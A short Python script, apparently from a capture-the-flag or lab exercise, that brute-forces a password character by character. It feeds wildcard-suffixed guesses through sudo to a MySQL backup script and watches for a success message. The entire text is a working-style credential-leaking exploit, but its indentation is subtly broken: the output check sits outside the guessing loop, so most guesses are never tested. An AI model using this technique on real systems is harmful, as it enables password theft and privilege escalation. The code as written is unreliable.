import string
import subprocess

wordlist = string.ascii_letters + string.digits
cont = ""

while True:
    for i in wordlist:
        entrada = cont + i + "*"

        proceso = subprocess.Popen(
            ["sudo", "/opt/scripts/mysql-backup.sh"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
    stdout, stderr = proceso.communicate(input=entrada)

    if "Done!" in stdout:
        cont += i
        print(cont)